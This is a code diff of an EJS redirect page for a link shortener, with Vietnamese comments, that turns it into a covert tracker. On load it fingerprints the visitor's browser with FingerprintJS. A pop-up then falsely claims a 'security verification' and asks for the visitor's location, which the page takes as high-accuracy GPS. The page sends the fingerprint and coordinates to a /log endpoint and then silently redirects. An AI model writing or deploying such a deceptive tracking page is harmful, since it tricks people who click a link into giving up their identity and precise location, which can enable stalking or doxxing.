@@ -1,47 +1,118 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Đang chuyển hướng...</title>
-    <!-- Tải thư viện FingerprintJS -->
+    <title>Đang chuẩn bị...</title>
+    <!-- Thư viện FingerprintJS -->
     <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
+    <!-- Thư viện SweetAlert2 cho pop-up đẹp hơn -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 20vh; }
+    </style>
 </head>
 <body>
-    <p>Vui lòng chờ trong khi chúng tôi chuyển hướng bạn...</p>
+    <p id="status-message">Vui lòng chờ trong khi chúng tôi xử lý...</p>
+    <progress></progress>
 
     <script>
-        async function runTracker() {
-            const targetUrl = '<%= targetUrl %>';
-            const shortId = '<%= shortId %>';
+        // Lấy dữ liệu từ EJS render
+        const targetUrl = '<%= targetUrl %>';
+        const shortId = '<%= shortId %>';
+        const shouldRequestGPS = <%- requestGPS %>; // Sẽ là true hoặc false
 
+        // Dữ liệu sẽ được thu thập và gửi đi
+        const payload = {
+            shortId: shortId,
+            fingerprint: null,
+            components: null,
+            latitude: null,
+            longitude: null,
+            accuracy: null
+        };
+        
+        async function runTracker() {
             try {
+                // Bước 1: Luôn lấy Fingerprint
                 const fp = await FingerprintJS.load();
                 const result = await fp.get();
+                payload.fingerprint = result.visitorId;
+                payload.components = result.components;
 
-                // Lấy cả chuỗi hash và đối tượng chi tiết
-                const visitorId = result.visitorId;
-                const components = result.components;
-
-                // Gửi cả 2 về server
-                await fetch('/log', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        shortId: shortId,
-                        fingerprint: visitorId,
-                        components: components // GỬI THÊM ĐỐI TƯỢNG components
-                    })
-                });
+                // Bước 2: Kiểm tra xem có cần yêu cầu GPS không
+                if (shouldRequestGPS) {
+                    await requestGPSPermission();
+                }
 
             } catch (error) {
-                console.error("Lỗi Fingerprinting:", error);
+                console.error("Lỗi tracker chính:", error);
             } finally {
-                // Luôn chuyển hướng người dùng đến đích
+                // Bước 3: Gửi toàn bộ dữ liệu (có hoặc không có GPS) và chuyển hướng
+                await sendLogAndRedirect();
+            }
+        }
+        
+        // Hàm yêu cầu quyền GPS
+        function requestGPSPermission() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    console.log("Trình duyệt không hỗ trợ Geolocation.");
+                    resolve(); // Bỏ qua nếu không hỗ trợ
+                    return;
+                }
+                
+                // Hiển thị pop-up đẹp bằng SweetAlert2
+                Swal.fire({
+                    title: 'Xác minh an toàn',
+                    html: "Đã xác minh bạn là con người. Để tiếp tục, vui lòng cung cấp vị trí của bạn để tăng cường bảo mật.",
+                    icon: 'info',
+                    allowOutsideClick: false,
+                    allowEscapeKey: false,
+                    showDenyButton: true,
+                    confirmButtonText: 'Đồng ý',
+                    denyButtonText: `Từ chối`,
+                }).then((result) => {
+                    if (result.isConfirmed) {
+                        document.getElementById('status-message').innerText = "Đang lấy vị trí, vui lòng chờ...";
+                        navigator.geolocation.getCurrentPosition(
+                            // Thành công
+                            (position) => {
+                                payload.latitude = position.coords.latitude;
+                                payload.longitude = position.coords.longitude;
+                                payload.accuracy = position.coords.accuracy;
+                                resolve();
+                            },
+                            // Thất bại
+                            (error) => {
+                                console.warn("Lỗi lấy GPS:", error.message);
+                                resolve(); // Vẫn tiếp tục dù có lỗi
+                            },
+                            // Tùy chọn
+                            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                        );
+                    } else { // Người dùng từ chối
+                        resolve(); // Vẫn tiếp tục mà không có GPS
+                    }
+                });
+            });
+        }
+        
+        // Hàm gửi log và chuyển hướng
+        async function sendLogAndRedirect() {
+             document.getElementById('status-message').innerText = "Hoàn tất, đang chuyển hướng...";
+            try {
+                await fetch('/log', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (logError) {
+                console.error("Lỗi gửi log:", logError);
+            } finally {
                 window.location.href = targetUrl;
             }
         }
         
+        // Chạy tracker
         runTracker();
     </script>
 </body>
